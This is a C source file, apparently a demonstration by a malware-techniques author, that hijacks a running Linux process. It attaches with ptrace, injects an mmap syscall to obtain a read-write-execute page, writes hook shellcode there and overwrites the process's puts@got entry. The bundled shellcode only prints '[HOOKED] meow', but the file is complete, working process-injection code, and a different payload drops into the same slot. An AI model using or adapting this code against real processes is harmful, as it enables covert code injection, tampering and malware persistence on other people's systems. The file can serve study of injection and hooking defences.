/*
 * hack.c
 * GOT/PLT hijacking: attaches to a running process via ptrace,
 * injects an rwx page, writes hook shellcode, overwrites puts@got
 * author: @cocomelonc
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <elf.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <stdint.h>

/*
 * hook shellcode: write(1, "[HOOKED] meow\n", 14) + ret
 * the string is appended at the end, addressed via rip-relative lea
 *
 * layout:
 *   0x00  mov rax, 1      (7 bytes)
 *   0x07  mov rdi, 1      (7 bytes)
 *   0x0e  lea rsi, [rip+0x0a] (7 bytes, RIP after = 0x15)
 *   0x15  mov rdx, 14     (7 bytes)
 *   0x1c  syscall        (2 bytes)
 *   0x1e  ret          (1 byte)
 *   0x1f  "[HOOKED] meow\n"   (14 bytes)
 */
static unsigned char hook_sc[] = {
  0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,
  0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,
  0x48, 0x8d, 0x35, 0x0a, 0x00, 0x00, 0x00,
  0x48, 0xc7, 0xc2, 0x0e, 0x00, 0x00, 0x00,
  0x0f, 0x05,
  0xc3,
  '[','H','O','O','K','E','D',']',' ','m','e','o','w','\n'
};

/* write len bytes of data into the tracee at addr, 8 bytes at a time */
static void poke_bytes(pid_t pid, uint64_t addr, void *data, size_t len) {
  size_t i;
  for (i = 0; i + 8 <= len; i += 8) {
    uint64_t word;
    memcpy(&word, (uint8_t *)data + i, 8);
    ptrace(PTRACE_POKEDATA, pid, addr + i, word);
  }
  if (i < len) {
    /* read-modify-write for the last partial chunk */
    uint64_t word = ptrace(PTRACE_PEEKDATA, pid, addr + i, NULL);
    memcpy(&word, (uint8_t *)data + i, len - i);
    ptrace(PTRACE_POKEDATA, pid, addr + i, word);
  }
}

/*
 * inject a mmap(NULL,4096,PROT_RWX,MAP_PRIVATE|MAP_ANON,-1,0) syscall
 * into the tracee by patching two bytes at RIP to 0f 05 (syscall),
 * single-stepping, then restoring registers and the original instruction
 */
static uint64_t inject_mmap(pid_t pid) {
  struct user_regs_struct regs, saved;
  uint64_t saved_instr;

  ptrace(PTRACE_GETREGS, pid, NULL, &saved);
  regs = saved;

  saved_instr = ptrace(PTRACE_PEEKTEXT, pid, saved.rip, NULL);
  ptrace(PTRACE_POKETEXT, pid, saved.rip,
       (saved_instr & ~(uint64_t)0xffff) | 0x050f);

  regs.rax = 9;
  regs.rdi = 0;
  regs.rsi = 4096;
  regs.rdx = 7;
  regs.r10 = 0x22;
  regs.r8  = (uint64_t)-1;
  regs.r9  = 0;
  ptrace(PTRACE_SETREGS, pid, NULL, &regs);

  ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
  waitpid(pid, NULL, 0);

  ptrace(PTRACE_GETREGS, pid, NULL, &regs);
  uint64_t page = regs.rax;

  ptrace(PTRACE_POKETEXT, pid, saved.rip, saved_instr);
  ptrace(PTRACE_SETREGS, pid, NULL, &saved);

  return page;
}

/* parse /proc/<pid>/exe and return the virtual address of puts@got */
static uint64_t find_puts_got(pid_t pid) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/exe", pid);
  int fd = open(path, O_RDONLY);
  if (fd < 0) { perror("open exe"); return 0; }

  uint8_t *buf = NULL;
  size_t sz = 0;
  uint8_t tmp[4096];
  ssize_t n;
  while ((n = read(fd, tmp, sizeof(tmp))) > 0) {
    buf = realloc(buf, sz + n);
    memcpy(buf + sz, tmp, n);
    sz += n;
  }
  close(fd);

  Elf64_Ehdr *ehdr   = (Elf64_Ehdr *)buf;
  Elf64_Shdr *shdrs  = (Elf64_Shdr *)(buf + ehdr->e_shoff);
  char *shstrtab   = (char *)(buf + shdrs[ehdr->e_shstrndx].sh_offset);

  Elf64_Shdr *rela_plt = NULL, *dynsym_s = NULL, *dynstr_s = NULL;
  for (int i = 0; i < ehdr->e_shnum; i++) {
    char *name = shstrtab + shdrs[i].sh_name;
    if (!strcmp(name, ".rela.plt")) rela_plt = &shdrs[i];
    if (!strcmp(name, ".dynsym"))   dynsym_s  = &shdrs[i];
    if (!strcmp(name, ".dynstr"))   dynstr_s  = &shdrs[i];
  }

  if (!rela_plt || !dynsym_s || !dynstr_s) {
    fprintf(stderr, "required ELF sections not found\n");
    free(buf); return 0;
  }

  Elf64_Rela *relas  = (Elf64_Rela *)(buf + rela_plt->sh_offset);
  int     count  = rela_plt->sh_size / sizeof(Elf64_Rela);
  Elf64_Sym  *syms   = (Elf64_Sym  *)(buf + dynsym_s->sh_offset);
  char     *strtab = (char     *)(buf + dynstr_s->sh_offset);

  uint64_t addr = 0;
  for (int i = 0; i < count; i++) {
    uint32_t idx = ELF64_R_SYM(relas[i].r_info);
    if (!strcmp(strtab + syms[idx].st_name, "puts")) {
      addr = relas[i].r_offset;
      break;
    }
  }

  free(buf);
  return addr;
}

int main(int argc, char *argv[]) {
  if (argc < 2) {
    fprintf(stderr, "usage: %s <pid>\n", argv[0]);
    return 1;
  }
  pid_t pid = (pid_t)atoi(argv[1]);

  printf("attaching to pid %d...\n", pid);
  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
    perror("ptrace attach"); return 1;
  }
  waitpid(pid, NULL, 0);
  printf("attached\n");

  uint64_t got_puts = find_puts_got(pid);
  if (!got_puts) {
    fprintf(stderr, "puts@got not found\n");
    ptrace(PTRACE_DETACH, pid, NULL, NULL); return 1;
  }
  printf("puts@got: 0x%lx\n", got_puts);

  printf("injecting mmap syscall...\n");
  uint64_t page = inject_mmap(pid);
  if ((int64_t)page < 0) {
    fprintf(stderr, "mmap failed\n");
    ptrace(PTRACE_DETACH, pid, NULL, NULL); return 1;
  }
  printf("rwx page allocated: 0x%lx\n", page);

  printf("writing hook shellcode...\n");
  poke_bytes(pid, page, hook_sc, sizeof(hook_sc));
  printf("%zu bytes written\n", sizeof(hook_sc));

  printf("overwriting puts@got...\n");
  ptrace(PTRACE_POKEDATA, pid, got_puts, page);
  printf("puts@got -> 0x%lx\n", page);

  ptrace(PTRACE_DETACH, pid, NULL, NULL);
  printf("detached. victim is now hooked!\n");
  return 0;
}